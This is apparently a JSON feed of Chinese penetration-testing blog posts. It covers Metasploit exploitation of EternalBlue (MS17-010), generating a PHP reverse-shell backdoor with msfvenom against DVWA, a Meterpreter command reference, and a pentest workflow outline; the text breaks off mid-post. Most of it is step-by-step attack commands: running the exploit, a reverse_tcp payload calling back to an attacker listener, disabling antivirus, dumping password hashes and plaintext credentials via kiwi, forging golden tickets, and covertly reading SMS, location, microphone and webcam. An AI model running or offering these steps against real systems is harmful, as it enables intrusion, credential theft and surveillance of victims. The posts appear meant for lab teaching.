id=\"三-原理-永恒之蓝是在windows的smb服务处理smb-v1请求时发生的漏洞这个漏洞导致攻击者在目标系统上可以执行任意代码-通过永恒之蓝漏洞会扫描开放445文件共享端口的windows机器无需用户任何操作只要开机上网不法分子就能在电脑和服务器中植入勒索软件-远程控制木马-虚拟货币挖矿机等恶意程序\"><a class=\"anchor\" href=\"#三-原理-永恒之蓝是在windows的smb服务处理smb-v1请求时发生的漏洞这个漏洞导致攻击者在目标系统上可以执行任意代码-通过永恒之蓝漏洞会扫描开放445文件共享端口的windows机器无需用户任何操作只要开机上网不法分子就能在电脑和服务器中植入勒索软件-远程控制木马-虚拟货币挖矿机等恶意程序\">#</a> <strong>三、原理</strong>     永恒之蓝是在 Windows 的 SMB 服务处理 SMB v1 请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。通过永恒之蓝漏洞会扫描开放 445 文件共享端口的 Windows 机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</h1>\n<h1 id=\"四-cve-2017-0144-利用方法\"><a class=\"anchor\" href=\"#四-cve-2017-0144-利用方法\">#</a> <strong>四、CVE-2017-0144 利用方法</strong></h1>\n<p>1  启动 Metasploit</p>\n<p>终端里输入 msfconsole</p>\n<p>2 查询利用模块</p>\n<p>终端里输入 search ms17_010</p>\n<p>a<img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/960ae38818084260be8eb69e589edba4.png\" alt=\"img\"></p>\n<p>3 使用探测模块</p>\n<p>终端内输入  use auxiliary/scanner/smb/smb_ms17_010</p>\n<p>4 设置探测范围</p>\n<p>终端内输入  show options</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/ab7ca3d4ba774677bc2a239c420349f7.png\" alt=\"img\"></p>\n<p>上图中我们可以看到是需要配置一个 RHOSTS</p>\n<p>终端内输入  set rhosts  192.168.3.0/24  （设置扫描当前网段  可以通过 在终端内输入 ip a 查看）</p>\n<p>也可以设置范围 set rhosts 192.168.3.1-192.168.3.10</p>\n<p>5 开始探测</p>\n<p>终端内输入  run 执行探测</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/7df1f73ea464404091de9c13d885c139.png\" alt=\"img\"></p>\n<p>根据上图我们可以看到 192.168.3.8 这个 IP 的机器可能存在漏洞</p>\n<p>6 开始漏洞利用</p>\n<p>开始利用首先在终端里输入<br>\n search ms17_010</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/8bf107d057a34676984a5d5e8b9bae73.png\" alt=\"img\"><br>\n 使用 模块<br>\n use  exploit/windows/smb/ms17_010_eternalblue</p>\n<p>7 配置利用模块</p>\n<p>配置模块<br>\n show options<br>\n 配置靶机<br>\n set rhost 192.168.3.8  这里 IP 填第五步探测到的 IP</p>\n<p>8 执行攻击</p>\n<p>在终端里输入  run</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/8a0c81062f424c7682a329503a315313.png\" alt=\"img\"></p>\n<p>知道咱们看到 win  则攻击成功 拿到 meterpreter</p>\n<p>9 后渗透操作</p>\n<p>查看进程：ps<br>\n 查看当前进程号：getpid<br>\n 查看系统信息：sysinfo<br>\n 查看目标机是否为虚拟机：run post/windows/gather/checkvm<br>\n 查看完整网络设置：route<br>\n 查看当前权限：getuid<br>\n 自动提权：getsystem<br>\n 关闭杀毒软件：run post/windows/manage/killav<br>\n 启动远程桌面协议：run post/windows/manage/enable_rdp<br>\n 列举当前登录的用户：run post/windows/gather/enum_logged_on_users<br>\n 查看当前应用程序：run post/windows/gather/enum_applications<br>\n 抓取目标机的屏幕截图：load espia ； screengrab<br>\n 抓取摄像头的照片：webcam_snap<br>\n 查看当前处于目标机的那个目录：pwd<br>\n 查看当前目录：getlwd</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/PHP%E5%90%8E%E9%97%A8%E5%8F%8D%E5%BC%B9%E6%BC%94%E7%A4%BA/",
            "url": "https://mangpumo.github.io/2023/01/12/PHP%E5%90%8E%E9%97%A8%E5%8F%8D%E5%BC%B9%E6%BC%94%E7%A4%BA/",
            "title": "PHP后门反弹演示",
            "date_published": "2023-01-11T20:48:56.000Z",
            "content_html": "<h1 id=\"一-环境准备\"><a class=\"anchor\" href=\"#一-环境准备\">#</a> 一、 环境准备</h1>\n<h3 id=\"1-dvwa靶场\"><a class=\"anchor\" href=\"#1-dvwa靶场\">#</a> 1 DVWA 靶场</h3>\n<p>DVWA 下载：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlbG9hZC5naXRodWIuY29tL2V0aGljYWxoYWNrM3IvRFZXQS96aXAvbWFzdGVy\">https://codeload.github.com/ethicalhack3r/DVWA/zip/master</span></p>\n<p>注意：配置 DVWA 环境 准备 PHP7.0 以上，和 Nginx 环境<br>\n 1 配置数据库密码  配置 config/config.inc.php.dist 文件（注意后门的 .dist 要通过重命名删掉）<br>\n2 使用浏览器访问 <span class=\"exturl\" data-url=\"aHR0cDovL1h4SVAvc2V0dXAucGhw\">http://XxIP/setup.php</span><br>\n3 红字问题解决<br>\n 4 缺少 key  直接替换下面 2 句  或者 访问 https://www.google.com/recaptcha/admin/create<br>\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>D</mi></msub><mi>V</mi><mi>W</mi><mi>A</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>r</mi><mi>e</mi><mi>c</mi><mi>a</mi><mi>p</mi><mi>t</mi><mi>c</mi><mi>h</mi><msub><mi>a</mi><mi>p</mi></msub><mi>u</mi><mi>b</mi><mi>l</mi><mi>i</mi><msub><mi>c</mi><mi>k</mi></msub><mi>e</mi><msup><mi>y</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><msup><mo>=</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mn>6</mn><mi>L</mi><mi>d</mi><mi>J</mi><mi>J</mi><mi>l</mi><mi>U</mi><mi>U</mi><mi>A</mi><mi>A</mi><mi>A</mi><mi>A</mi><mi>A</mi><mi>H</mi><mn>1</mn><mi>Q</mi><mn>6</mn><mi>c</mi><mi>T</mi><mi>p</mi><mi>Z</mi><mi>R</mi><mi>Q</mi><mn>2</mn><mi>A</mi><mi>h</mi><mn>8</mn><mi>V</mi><mi>p</mi><mi>y</mi><mi>z</mi><mi>h</mi><mi>n</mi><mi>f</mi><mi>f</mi><mi>D</mi><mn>0</mn><mi>m</mi><mi>B</mi><msup><mi>b</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo separator=\"true\">;</mo></mrow><annotation encoding=\"application/x-tex\">_DVWA[ &#x27;recaptcha_public_key&#x27; ] = &#x27;6LdJJlUUAAAAAH1Q6cTpZRQ2Ah8VpyzhnffD0mBb&#x27;;\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.038em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mord mathnormal\">A</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">h</span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">p</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">i</span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mrel\">=</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.946332em;vertical-align:-0.19444em;\"></span><span class=\"mord\">6</span><span class=\"mord mathnormal\">L</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord mathnormal\" style=\"margin-right:0.09618em;\">J</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">U</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mord\">1</span><span class=\"mord mathnormal\">Q</span><span class=\"mord\">6</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathnormal\">Q</span><span class=\"mord\">2</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\">h</span><span class=\"mord\">8</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">V</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord\">0</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mpunct\">;</span></span></span></span>_DVWA[ 'recaptcha_private_key' ] = '6LdJJlUUAAAAAM2a3HrgzLczqdYp4g05EqDs-W4K';<br>\n5 allow_url_include: Disabled  提示没开启<br>\n找到 php 目录里的 php.ini allow_url_include  将后面参数 OFF 改成 On 修改完成重启 Nginx 生效</p>\n<h3 id=\"2-metasploit任意平台\"><a class=\"anchor\" href=\"#2-metasploit任意平台\">#</a> 2 Metasploit 任意平台</h3>\n<p>可以是 Windows 版，可以是 kali 自带版</p>\n<h1 id=\"二-metasploit配置监控及攻击载荷\"><a class=\"anchor\" href=\"#二-metasploit配置监控及攻击载荷\">#</a> 二、Metasploit 配置监控及攻击载荷</h1>\n<h3 id=\"1-配置监控-使用handler模块\"><a class=\"anchor\" href=\"#1-配置监控-使用handler模块\">#</a> 1 配置监控 - 使用 handler 模块</h3>\n<h3 id=\"use-exploitmultihandler\"><a class=\"anchor\" href=\"#use-exploitmultihandler\">#</a> use exploit/multi/handler</h3>\n<h3 id=\"img-2-配置攻击载荷设置payload\"><a class=\"anchor\" href=\"#img-2-配置攻击载荷设置payload\">#</a> <img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/a2529fe010ac46108a0413b8153c08b0.png\" alt=\"img\">  2 配置攻击载荷设置 payload</h3>\n<h3 id=\"第一步设置payload\"><a class=\"anchor\" href=\"#第一步设置payload\">#</a> 第一步设置 payload</h3>\n<h3 id=\"set-payload-phpmeterpreterreverse_tcp\"><a class=\"anchor\" href=\"#set-payload-phpmeterpreterreverse_tcp\">#</a> set payload php/meterpreter/reverse_tcp</h3>\n<h3 id=\"第二步设置-lhost-和-lport\"><a class=\"anchor\" href=\"#第二步设置-lhost-和-lport\">#</a> 第二步设置 lhost 和 lport</h3>\n<h3 id=\"set-lhost-xxxip\"><a class=\"anchor\" href=\"#set-lhost-xxxip\">#</a> set lhost xxxip ；</h3>\n<h3 id=\"set-lport-xxx端口\"><a class=\"anchor\" href=\"#set-lport-xxx端口\">#</a> set lport  xxx 端口；</h3>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/ad204b7bb1bc4c709f4d6948d4ef219a.png\" alt=\"img\"></p>\n<h3 id=\"3-生成php后门执行攻击获得meterpreter\"><a class=\"anchor\" href=\"#3-生成php后门执行攻击获得meterpreter\">#</a> 3 生成 php 后门执行攻击获得 meterpreter</h3>\n<p>新建一个终端在终端内输入</p>\n<p>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.3.23 lport=4456 R&gt;shell.php</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1fa4967afb3f487f84926004d4ddc591.png\" alt=\"img\"></p>\n<p>3.2 传播 - 使用 Python 简单的 web 服务</p>\n<p>python -m SimpleHTTPServer 80</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/6604546c76d7471e9f332e81daf6c570.png\" alt=\"img\"></p>\n<p>将 shell.php</p>\n<p>3.3 执行攻击获得 meterpreter</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1003035b32a343488a282bddec48a62b.png\" alt=\"img\"></p>\n<p>run 或者 exploit</p>\n<p>获取到 meterpreter 我们就可以做渗透操作了</p>\n<p>比如 观看屏幕 可以在 meterpreter 里输入</p>\n<p>run vnc</p>\n<p>查看当前账号可以在 meterpreter 里输入</p>\n<p>getuid</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/meterpreter/",
            "url": "https://mangpumo.github.io/2023/01/12/meterpreter/",
            "title": "meterpreter",
            "date_published": "2023-01-11T20:46:09.000Z",
            "content_html": "<h1 id=\"一-meterpreter是什么\"><a class=\"anchor\" href=\"#一-meterpreter是什么\">#</a> 一、 Meterpreter 是什么</h1>\n<p>Meterpreter 是 Metasploit 框架中的一个利器，作为漏洞溢出后的攻击载荷使用，攻击载荷在触发漏洞后会返回一个由我们控制的通道，可用于远程执行命令！<br>\nMetasploit 提供了各个主流平台的 Meterpreter 版本，包括 Windows、Linux，同时支持 x86、x64 平台，另外，Meterpreter 还提供了基于 PHP 和 Java 语言的实现。Meterpreter 的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，Meterpreter 还支持 Ruby 脚本形式的扩展。所以 Ruby 语言还很有必要了解下。</p>\n<h1 id=\"二-meterpreter中常用的反弹类型\"><a class=\"anchor\" href=\"#二-meterpreter中常用的反弹类型\">#</a> 二、Meterpreter 中常用的反弹类型</h1>\n<p>1.reverse_tcp<br>\n 这是一个基于 TCP 的反向链接反弹 shell, 使用起来很稳定</p>\n<h1 id=\"三-meterpreter的常用命令\"><a class=\"anchor\" href=\"#三-meterpreter的常用命令\">#</a> 三、Meterpreter 的常用命令</h1>\n<h2 id=\"1基本命令\"><a class=\"anchor\" href=\"#1基本命令\">#</a> 1. 基本命令</h2>\n<p>help# 查看 Meterpreter 帮助</p>\n<p>background# 返回，把 meterpreter 后台挂起<br>\n bgkill# 杀死一个 meterpreter 脚本<br>\n bglist# 提供所有正在运行的后台脚本的列表<br>\n bgrun# 作为一个后台线程运行脚本<br>\n channel# 显示活动频道<br>\n sessions -i number # 与会话进行交互，number 表示第 n 个 session, 使用 session -i 连接到指定序号的 meterpreter 会话已继续利用<br>\n sesssions -k  number #与会话进行交互<br>\n close# 关闭通道<br>\n exit# 终止 meterpreter 会话<br>\n quit# 终止 meterpreter 会话<br>\n interact id #切换进一个信道<br>\n run# 执行一个已有的模块，这里要说的是输入 run 后按两下 tab，会列出所有的已有的脚本，常用的有 autoroute,hashdump,arp_scanner,multi_meter_inject 等<br>\n irb# 进入 Ruby 脚本模式<br>\n read# 从通道读取数据 write# 将数据写入到一个通道<br>\n run 和 bgrun# 前台和后台执行以后它选定的 meterpreter 脚本<br>\n use# 加载 meterpreter 的扩展<br>\n load/use# 加载模块<br>\n Resource# 执行一个已有的 rc 脚本</p>\n<h2 id=\"2-常用命令\"><a class=\"anchor\" href=\"#2-常用命令\">#</a> 2  常用命令</h2>\n<h3 id=\"21-针对安卓手机的一些命令\"><a class=\"anchor\" href=\"#21-针对安卓手机的一些命令\">#</a> 2.1 针对安卓手机的一些命令</h3>\n<p>获取手机通讯录： dump_contacts</p>\n<p>获取短信记录：dump_sms</p>\n<p>控制实验手机发短信：send_sms -d 15330252525 -t<br>\n&quot;hello&quot;</p>\n<p>获取实验手机 GPS 定位信息：geolocate</p>\n<p>获取实验手机 Wi-Fi 定位信息：wlan_geolocate</p>\n<p>控制实验手机录音：record_mic<br>\n-d  5</p>\n<p>获取实验手机相机设备：webcam_list</p>\n<p>控制实验手机拍照 ：webcam_snap</p>\n<p>直播实验手机摄像头：webcam_stream</p>\n<h3 id=\"22-针对windows的一些命令\"><a class=\"anchor\" href=\"#22-针对windows的一些命令\">#</a> 2.2 针对 Windows 的一些命令</h3>\n<p>查看进程：ps</p>\n<p>查看当前进程号：getpid</p>\n<p>查看系统信息：sysinfo</p>\n<p>查看目标机是否为虚拟机：run<br>\npost/windows/gather/checkvm</p>\n<p>查看完整网络设置：route</p>\n<p>查看当前权限：getuid</p>\n<p>自动提权：getsystem</p>\n<p>关闭杀毒软件：run post/windows/manage/killav</p>\n<p>启动远程桌面协议：run post/windows/manage/enable_rdp</p>\n<p>列举当前登录的用户：run post/windows/gather/enum_logged_on_users</p>\n<p>查看当前应用程序：run post/windows/gather/enum_applications</p>\n<p>抓取目标机的屏幕截图：load espia ； screengrab</p>\n<p>获取相机设备：webcam_list</p>\n<p>控制拍照 ：webcam_snap</p>\n<p>直播摄像头：webcam_stream</p>\n<p>控制录音：record_mic</p>\n<p>查看当前处于目标机的那个目录：pwd</p>\n<p>查看当前目录：getlwd</p>\n<p>导出当前用户密码哈希  run hashdump</p>\n<p>用户名：SID：LM 哈希：NTLM 哈希:::</p>\n<p>也可以使用下面这个命令导出 权限更高   run windows/gather/smart_hashdump</p>\n<p>抓取自动登录的用户名和密码  run windows/gather/credentials/windows_autologin</p>\n<p>直接获取明文密码（注意这个功能需要获取系统权限  获取系统权限需要输入 getsystem）</p>\n<p>首选终端输入  load kiwi    加载 kiwi</p>\n<p>creds_all：列举所有凭据<br>\n creds_kerberos：列举所有 kerberos 凭据<br>\n creds_msv：列举所有 msv 凭据<br>\n creds_ssp：列举所有 ssp 凭据<br>\n creds_tspkg：列举所有 tspkg 凭据<br>\n creds_wdigest：列举所有 wdigest 凭据<br>\n dcsync：通过 DCSync 检索用户帐户信息<br>\n dcsync_ntlm：通过 DCSync 检索用户帐户 NTLM 散列、SID 和 RID<br>\ngolden_ticket_create：创建黄金票据<br>\n kerberos_ticket_list：列举 kerberos 票据<br>\n kerberos_ticket_purge：清除 kerberos 票据<br>\n kerberos_ticket_use：使用 kerberos 票据<br>\n kiwi_cmd：执行 mimikatz 的命令，后面接 mimikatz.exe 的命令<br>\n lsa_dump_sam：dump 出 lsa 的 SAM<br>\nlsa_dump_secrets：dump 出 lsa 的密文<br>\n password_change：修改密码<br>\n wifi_list：列出当前用户的 wifi 配置文件<br>\n wifi_list_shared：列出共享 wifi 配置文件 / 编码</p>\n<h2 id=\"3文件系统命令\"><a class=\"anchor\" href=\"#3文件系统命令\">#</a> 3. 文件系统命令</h2>\n<p>cat c:\\boot.ini# 查看文件内容，文件必须存在<br>\n del c:\\boot.ini #删除指定的文件<br>\n upload /root/Desktop/netcat.exe c:\\ # 上传文件到目标机主上，如 upload  setup.exe C:\\windows\\system32<br>\ndownload nimeia.txt/root/Desktop/   # 下载文件到本机上如：download C:\\boot.ini/root / 或者 download C:\\&quot;ProgramFiles&quot;\\Tencent\\QQ\\Users\\295****<em><em>125\\Msg2.0.db /root/<br>\nedit c:\\boot.ini  # 编辑文件<br>\n getlwd# 打印本地目录<br>\n getwd# 打印工作目录<br>\n lcd# 更改本地目录<br>\n ls# 列出在当前目录中的文件列表<br>\n lpwd# 打印本地目录<br>\n pwd# 输出工作目录<br>\n cd c:\\ #进入目录文件下<br>\n rm file #删除文件<br>\n mkdir dier #在受害者系统上的创建目录<br>\n rmdir# 受害者系统上删除目录<br>\n dir# 列出目标主机的文件和文件夹信息<br>\n mv# 修改目标主机上的文件名<br>\n search -d d:\\www -f web.config #search 文件，如 search  -d c:\\  -f</em>.doc<br>\nmeterpreter &gt; search -f autoexec.bat  #搜索文件<br>\n meterpreter &gt; search -f sea</em>.bat c:\\xamp\\<br>\nenumdesktops     #用户登录数</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/12/msfconsole%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B/",
            "url": "https://mangpumo.github.io/2023/01/12/msfconsole%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B/",
            "title": "msfconsole漏洞利用流程",
            "date_published": "2023-01-11T19:46:27.000Z",
            "content_html": "<h1 id=\"一-阶段划分\"><a class=\"anchor\" href=\"#一-阶段划分\">#</a> 一、阶段划分：</h1>\n<p>漏洞利用分为 前期交互   情报搜集 威胁建模  漏洞分析。渗透利用  后渗透利用 报告 这几个阶段</p>\n<h2 id=\"1前期交互阶段\"><a class=\"anchor\" href=\"#1前期交互阶段\">#</a> 1. 前期交互阶段：</h2>\n<p>与客户组织进行交互讨论，确定范围，目标等</p>\n<p>​         这个阶段大家可以理解为情报收集前阶段，主要是为了找到目标 确认范围</p>\n<p>![1643165117094](10-11  msfconsole 漏洞利用流程.assets/1643165117094.png)</p>\n<h2 id=\"2情报搜集阶段\"><a class=\"anchor\" href=\"#2情报搜集阶段\">#</a> 2. 情报搜集阶段：</h2>\n<p>获取更多目标组织信息，</p>\n<p>|          外围信息搜索   -    Google</p>\n<p>![1643165139006](10-11  msfconsole 漏洞利用流程.assets/1643165139006.png)</p>\n<p>​          主机探测与端口扫描         如 -Nmap</p>\n<p>​           服务扫描       利用 metasploit 中的 auxiliary/scanner/ 中的服务扫描模块，可以对靶机中的服务版本等信息进行扫描</p>\n<p>​            网络漏洞扫描   -OpenVAS、Nessus 等</p>\n<p>​             其他工具扫描  py 脚本扫描</p>\n<h2 id=\"3威胁建模阶段\"><a class=\"anchor\" href=\"#3威胁建模阶段\">#</a> 3. 威胁建模阶段：</h2>\n<p>理清头绪，确定出最可行的漏洞利用通道，这个建模阶段写的文档不是给自己看的 是给整个团队看的 方便多人合作</p>\n<p>![1643165166875](10-11  msfconsole 漏洞利用流程.assets/1643165166875.png)</p>\n<p>​           这个阶段主要是根据收集到的情报进行整理 ，理清漏洞利用思路。</p>\n<h2 id=\"4漏洞分析阶段\"><a class=\"anchor\" href=\"#4漏洞分析阶段\">#</a> 4. 漏洞分析阶段：</h2>\n<p>搜索可获取的渗透代码资源</p>\n<p>![1643165182827](10-11  msfconsole 漏洞利用流程.assets/1643165182827.png)</p>\n<p>​           这个阶段主要 挑选匹配可能存在的漏洞利用模块，shellcode</p>\n<h2 id=\"5渗透利用阶段\"><a class=\"anchor\" href=\"#5渗透利用阶段\">#</a> 5. 渗透利用阶段：</h2>\n<p>找出安全漏洞，入侵系统</p>\n<p>​          这个阶段尝试利用漏洞 ，配置监控，开始漏洞利用</p>\n<h2 id=\"6后渗透利用阶段\"><a class=\"anchor\" href=\"#6后渗透利用阶段\">#</a> 6. 后渗透利用阶段：</h2>\n<p>Meterpreter，实施操作</p>\n<p>​            这个阶段 就开始实施相关数据下载 后门维持  提权等操作</p>\n<h2 id=\"7报告阶段\"><a class=\"anchor\" href=\"#7报告阶段\">#</a> 7. 报告阶段：</h2>\n<p>漏洞利用渗透测试报告  （详细报告编写看 渗透测试报告课程）</p>\n<p>![1643165204135](10-11  msfconsole 漏洞利用流程.assets/1643165204135.png)</p>\n<p>|             这个阶段主要是对本次渗透进行总结，概述总体上包括 时间、人员、漏洞利用范围、技术手段等等。我们需要在这部分确定漏洞利用执行的时间范围、参与漏洞利用的人员及联系方式、约定的漏洞利用范围和一些漏洞利用过程中采用的技术、工具描述。写清  前期交互   情报搜集 威胁建模  漏洞分析。渗透利用  后渗透利用  漏洞利用结果 安全建议 等内容</p>\n<p>在撰写的过程中，需要特别注意的是：漏洞描述切忌不可过于简单，一笔带过；在安全建议部分避免提出没有实际意义的安全建议，比如加强安全意识；报告结构混乱不堪，太多复杂的专业术语，比如绕狗、x 站等等；</p>\n<h1 id=\"二-实际操作举例\"><a class=\"anchor\" href=\"#二-实际操作举例\">#</a> 二、实际操作（举例）</h1>\n<p>主机范围和目标已确定</p>\n<p>1 情报搜集</p>\n<p>基于 msf 发现内网存活主机</p>\n<p>search 搜索</p>\n<p>msf 终端内输入 search scanner type:auxiliary</p>\n<p>可用于发现主机的模块</p>\n<p>auxiliary/scanner/discovery/arp_sweep # 基于 ARP 发现内网存活主机</p>\n<p>auxiliary/scanner/discovery/udp_sweep # 基于 UDP 发现内网存活主机</p>\n<p>auxiliary/scanner/ftp/ftp_version # 发现 FTP 服务</p>\n<p>auxiliary/scanner/http/http_version # 发现 HTTP 服务</p>\n<p>auxiliary/scanner/smb/smb_version # 基于 smb 发现内网存活主机</p>\n<p>基于 netbios 发现内网存活主机</p>\n<p>基于 snmap 发现内网存活主机</p>\n<p>基于 ICMP 发现内网存活主机</p>\n<p>2  威胁建模</p>\n<hr>\n<p>经过第一步情报收集 我们通过 arp 发现了 目标机器 ip</p>\n<p>然后通过对目标机器的 ip 扫描  我们知道了  目标机器开通了 80 端口  有 web 服务  开了 ftp 端口  有文件服务</p>\n<p>开了 smb</p>\n<p>最终决定对 smb 相关的漏洞进行利用</p>\n<p>备选方案通过植入木马的方式进行利用</p>\n<hr>\n<p>3   漏洞分析</p>\n<p>第一步先查看 smb 利用漏洞有哪些  比如永恒之蓝</p>\n<p>1 